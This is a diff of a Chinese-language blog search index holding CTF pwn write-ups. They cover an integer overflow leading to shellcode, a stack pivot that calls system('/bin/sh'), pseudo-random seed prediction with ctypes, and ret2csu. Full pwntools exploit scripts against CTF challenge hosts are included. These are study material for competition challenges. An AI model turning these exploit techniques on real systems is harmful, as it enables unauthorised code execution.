class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;yeye... this is a gift you: %p\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please come close to me:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里可以看出我们输入的n10的值，就是后面我们read能读入的最大字节数。这里做了限制只能读入10个字节，那肯定是不够我们经行利用的。不过这里还做了转换，即nbytes＝n10。而nbytes又是个无符号数。所以这里存在整型溢出。只要我们输入-1就可以转化成32位程序的INT_MAX。</p>
-<p>后面又给了我们输入的首地址。所以可以通过调用system函数传参&#x2F;bin&#x2F;sh来getshell。但是这里又没有system函数。所以可以输入shellcode来getshell。下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;api.wdsec.com.cn&#x27;</span>,<span class="number">31998</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;10!!!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">pl = shell</span><br><span class="line">pl = pl.ljust(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(stack)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="4-灵魂舞步"><a href="#4-灵魂舞步" class="headerlink" title="4.灵魂舞步"></a>4.灵魂舞步</h2><p>保护情况。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/RDCTF/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
-
-<p>首先是进行一个RDCTF函数的检测。只有这个函数通过以后才会进入secret函数，也就是漏洞函数。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">RDCTF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+4h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = rand() % <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Round %d: What is the secret number? &quot;</span>, i);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v3 = atoi(s);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong number, try again later.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;All ten guesses correct. i will give you my serect\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出，就是伪随机数。我们只需要去撞时间戳就行。所以可以引入ctypes库来绕过。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(ans).encode()) </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>然后我们来看一下secret函数里做了什么。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">serect</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i love you&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wait wait,what do you want to do? %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Nothing here ,%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出这里存在栈溢出，不过溢出字节只有0x10。那么很正常的可以想到栈迁移的手法来打。</p>
-<p>我们进gdb调试一下。</p>
-<p><img src="/images/RDCTF.png" alt="gdb"></p>
-<p>可以看出，当我们把0x30的地址都覆盖了以后，可以泄露出一处栈地址。那么我们就可以打栈上栈迁移了。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;api.wdsec.com.cn&#x27;,31191)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc.srand(libc.time(0))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>):&#123;libc.srand(libc.time(<span class="number">0</span>))&#125;</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(ans).encode()) </span><br><span class="line"><span class="comment">#io.sendline()</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;i love you\n&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(<span class="number">0x080493C5</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>)</span><br><span class="line">_=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">stack=u32(io.recv(<span class="number">4</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;number?&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>):&#123;libc.srand(libc.time(<span class="number">0</span>))&#125;</span><br><span class="line">    ans = libc.rand()%<span class="number">1000</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line">rsp = stack - <span class="number">0x50</span></span><br><span class="line"><span class="comment">#success(hex(rsp))</span></span><br><span class="line"><span class="comment">#success(hex(stack))</span></span><br><span class="line">leave = <span class="number">0x80493C3</span></span><br><span class="line">sys = <span class="number">0x80490b0</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(sys) + p32(<span class="number">0</span>) + p32(rsp+<span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pl = pl.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(rsp) + p32(leave)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这是我师傅写的脚本。而我之所以打不通，是因为没有考虑缓冲区的问题。</p>
-<p>我们进ida里可以发现main函数并没有初始化标准输入输出。而符号表中却有着init函数。同时在RDCTF函数中，有着fflush(stdout)。它刷新了缓冲区。所以导致我在打远端，等到第十次随机数绕过后，就没有了回显。所以第一次我们要先回到main函数，重新触发下fflush，来泄露出我们的栈地址。后面就是正常栈迁移的打法了。如果有不懂，可以看我别的文章里有讲。</p>
-<h1 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h1><p>缓冲区（buffer）分为三种类型：全缓冲，行缓冲和不带缓冲</p>
-<h2 id="1-全缓冲"><a href="#1-全缓冲" class="headerlink" title="1.全缓冲"></a>1.全缓冲</h2><p>在这种情况下，当填满标准I&#x2F;O缓存后，才进行实际I&#x2F;O操作。这里的I&#x2F;O可以理解为结构体。专门放我们写入的数据。典型代表是对磁盘文件的读写。</p>
-<h2 id="2-行缓冲"><a href="#2-行缓冲" class="headerlink" title="2.行缓冲"></a>2.行缓冲</h2><p>在这种情况下，当在输入和输出中遇到换行符(<code>&#39;\n&#39;</code>)时，执行真正的I&#x2F;O操作。这是，我们输入的字符先存放在缓冲区，等按下回车键换行时才进行实际的I&#x2F;O操作。典型代表是键盘输入数据。</p>
-<h2 id="3-不带缓冲"><a href="#3-不带缓冲" class="headerlink" title="3.不带缓冲"></a>3.不带缓冲</h2><p>不进行缓冲，标准出错情况stderr是典型代表，这使得出错信息可以直接尽快地显示出来。</p>
-<h2 id="4-缓冲区的刷新"><a href="#4-缓冲区的刷新" class="headerlink" title="4.缓冲区的刷新"></a>4.缓冲区的刷新</h2><ul>
-<li><p>缓冲区满时。</p>
-</li>
-<li><p>关闭文件。</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>stack</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Unlink_attack</title>
     <url>/2026/02/19/Unlink-attack/</url>
     <content><![CDATA[<h2 id="Unlink-attack"><a href="#Unlink-attack" class="headerlink" title="Unlink attack"></a><code>Unlink attack</code></h2><p>unlink，俗称拖链，将<code>unsorted_bin</code>中的处于free状态的堆块脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块（可以是向前合并或者向后合并），合并完之后再放入<code>unsorted_bin</code>中。</p>
@@ -976,31 +1020,6 @@
       </categories>
       <tags>
         <tag>pwn进阶</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>random</title>
-    <url>/2025/12/16/random/</url>
-    <content><![CDATA[<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>之前一直遇到随机数的题目，一直没有尝试，现在来记录一下新的一种解题方法，顺便加强一下Python能力。😁</p>
-<p><img src="/images/random1.png" alt="ida"></p>
-<p>可以看出来，这里基本上都是随机数，但是其实是伪随机，所以我们可以通过得到种子的值，来获得程序中的随机数。这里最主要的其实就是脚本的编写。</p>
-<p>由于我们脚本是由python来写的，而程序使用C语言。所以这里引用ctypes库。</p>
-<p><strong>ctypes</strong> 是 Python 的一个外部函数库，用于调用 C 语言的动态链接库（DLL）或共享库。它提供了与 C 语言兼容的数据类型，并允许在 Python 中直接调用 C 函数。</p>
-<p>通过分析程序可以看出，我们只要满足v7&#x3D;&#x3D;v8就可以获得shell。那么我们来看怎么得到v8的随机数呢？</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">seed = time(<span class="number">0LL</span>);</span><br><span class="line">srand(seed[<span class="number">0</span>]);</span><br><span class="line">v3 = rand();</span><br><span class="line">v4 = rand() ^ v3;</span><br><span class="line">v5 = rand();</span><br><span class="line">srand(v4 ^ v5);</span><br><span class="line">rand();</span><br><span class="line">rand();</span><br><span class="line">rand();</span><br><span class="line">v8 = rand();</span><br></pre></td></tr></table></figure>
-
-<p>可以看出，这里的种子是time(NULL)，得到两个随机数后，又重新设置了种子。也就是说只要我们求出新的种子，再求出第四个随机数就可以得到v8了。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">27416</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;username: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;password: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">seed = u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(seed)</span><br><span class="line"></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">v4 = libc.rand() ^ v3</span><br><span class="line">v5 = libc.rand()</span><br><span class="line">libc.srand(v4 ^ v5)</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">v7 = libc.rand()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;now.\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(v7))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这边解释一下exp。这里的s和seed[2]是紧挨着的，而read读取的最大长度刚好是0x20，也就是s所有的字节大小。那么当我读入0x20padding时，下面的printf便会输出，直到遇到\x00，也就是说，会读出seed[0]，也就是我们需要的第一个种子，也就可以得到接下来的种子了。</p>
-<p>ctypes.CDLL是加载动态链接库，也就是可以用来调用C语言。</p>
-]]></content>
-      <categories>
-        <category>stack</category>
-      </categories>
-      <tags>
-        <tag>pwn入门</tag>
       </tags>
   </entry>
   <entry>
@@ -1092,6 +1111,31 @@
       </tags>
   </entry>
   <entry>
+    <title>random</title>
+    <url>/2025/12/16/random/</url>
+    <content><![CDATA[<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>之前一直遇到随机数的题目，一直没有尝试，现在来记录一下新的一种解题方法，顺便加强一下Python能力。😁</p>
+<p><img src="/images/random1.png" alt="ida"></p>
+<p>可以看出来，这里基本上都是随机数，但是其实是伪随机，所以我们可以通过得到种子的值，来获得程序中的随机数。这里最主要的其实就是脚本的编写。</p>
+<p>由于我们脚本是由python来写的，而程序使用C语言。所以这里引用ctypes库。</p>
+<p><strong>ctypes</strong> 是 Python 的一个外部函数库，用于调用 C 语言的动态链接库（DLL）或共享库。它提供了与 C 语言兼容的数据类型，并允许在 Python 中直接调用 C 函数。</p>
+<p>通过分析程序可以看出，我们只要满足v7&#x3D;&#x3D;v8就可以获得shell。那么我们来看怎么得到v8的随机数呢？</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">seed = time(<span class="number">0LL</span>);</span><br><span class="line">srand(seed[<span class="number">0</span>]);</span><br><span class="line">v3 = rand();</span><br><span class="line">v4 = rand() ^ v3;</span><br><span class="line">v5 = rand();</span><br><span class="line">srand(v4 ^ v5);</span><br><span class="line">rand();</span><br><span class="line">rand();</span><br><span class="line">rand();</span><br><span class="line">v8 = rand();</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，这里的种子是time(NULL)，得到两个随机数后，又重新设置了种子。也就是说只要我们求出新的种子，再求出第四个随机数就可以得到v8了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">27416</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;username: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;password: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">seed = u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(seed)</span><br><span class="line"></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">v4 = libc.rand() ^ v3</span><br><span class="line">v5 = libc.rand()</span><br><span class="line">libc.srand(v4 ^ v5)</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">v7 = libc.rand()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;now.\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(v7))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这边解释一下exp。这里的s和seed[2]是紧挨着的，而read读取的最大长度刚好是0x20，也就是s所有的字节大小。那么当我读入0x20padding时，下面的printf便会输出，直到遇到\x00，也就是说，会读出seed[0]，也就是我们需要的第一个种子，也就可以得到接下来的种子了。</p>
+<p>ctypes.CDLL是加载动态链接库，也就是可以用来调用C语言。</p>
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>pwn入门</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>off_by_one</title>
     <url>/2026/02/19/off-by-one/</url>
     <content><![CDATA[<h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a><code>off-by-one</code></h2><p>off-by-one是指<code>单字节缓冲区溢出</code>其实不仅在堆里出现，在栈上也是一种可以利用的漏洞。不过在这里就仅仅考虑在堆上的利用。</p>
@@ -1127,28 +1171,6 @@
       </categories>
       <tags>
         <tag>pwn进阶</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ret2csu</title>
-    <url>/2025/11/21/ret2csu/</url>
-    <content><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>将附件丢进ida</p>
-<p><img src="/images/ret2csu-(1).png" alt="ida"></p>
-<p>可以看到，程序中不存在任何后门函数。但是附件又给了libc.so.6，所以我们可以通过write函数，将write或者read的地址进行泄露，从而达到ret2libc的做法。</p>
-<p>于是我们需要控制write的执行流。可以看出write有三个参数：fd，buf，len。在x86-64架构下，前六个参数依次存在rdi，rsi，rdx，rcx，r8，r9。所以我们只要做到rsi &#x3D; 1；rdi &#x3D; write_got；len&gt;&#x3D;8就可以了。</p>
-<p>__libc_csu_init进行初始化时有这么一串汇编指令：</p>
-<p><img src="/images/ret2csu-(2).png" alt="ida"></p>
-<p>如果我们把上半部分成为gadget2，下半部分gadget1。那么在gadget1中可以看出我们可以轻松控制pop到各个寄存器的值，再结合gadget2，可以看出控制r12间接控制rdi–fd（这里r12d是指取rdi的低四字节的值，因为是控制fd所以不影响）；控制r13间接控制rsi–write_got；控制r14间接控制rdx–len。所以我们需要在vuln中进行栈溢出，控制程序执行到gadget1的位置，然后精心构造各个寄存器的值，进行我们需要的充满特定参数的函数。</p>
-<p><img src="/images/ret2csu-(3).png" alt="exp"></p>
-<p>可以看到exp中还控制了rbx和rbp的值，这是为什么呢？</p>
-<p><img src="/images/ret2csu-(4).png" alt="ida"></p>
-<p>后面就是和ret2libc一样的做法了，就不多赘述了。</p>
-]]></content>
-      <categories>
-        <category>stack</category>
-      </categories>
-      <tags>
-        <tag>pwn入门</tag>
       </tags>
   </entry>
   <entry>
@@ -1270,6 +1292,28 @@
       </categories>
       <tags>
         <tag>C语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2csu</title>
+    <url>/2025/11/21/ret2csu/</url>
+    <content><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>将附件丢进ida</p>
+<p><img src="/images/ret2csu-(1).png" alt="ida"></p>
+<p>可以看到，程序中不存在任何后门函数。但是附件又给了libc.so.6，所以我们可以通过write函数，将write或者read的地址进行泄露，从而达到ret2libc的做法。</p>
+<p>于是我们需要控制write的执行流。可以看出write有三个参数：fd，buf，len。在x86-64架构下，前六个参数依次存在rdi，rsi，rdx，rcx，r8，r9。所以我们只要做到rsi &#x3D; 1；rdi &#x3D; write_got；len&gt;&#x3D;8就可以了。</p>
+<p>__libc_csu_init进行初始化时有这么一串汇编指令：</p>
+<p><img src="/images/ret2csu-(2).png" alt="ida"></p>
+<p>如果我们把上半部分成为gadget2，下半部分gadget1。那么在gadget1中可以看出我们可以轻松控制pop到各个寄存器的值，再结合gadget2，可以看出控制r12间接控制rdi–fd（这里r12d是指取rdi的低四字节的值，因为是控制fd所以不影响）；控制r13间接控制rsi–write_got；控制r14间接控制rdx–len。所以我们需要在vuln中进行栈溢出，控制程序执行到gadget1的位置，然后精心构造各个寄存器的值，进行我们需要的充满特定参数的函数。</p>
+<p><img src="/images/ret2csu-(3).png" alt="exp"></p>
+<p>可以看到exp中还控制了rbx和rbp的值，这是为什么呢？</p>
+<p><img src="/images/ret2csu-(4).png" alt="ida"></p>
+<p>后面就是和ret2libc一样的做法了，就不多赘述了。</p>
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>pwn入门</tag>
       </tags>
   </entry>
 </search>
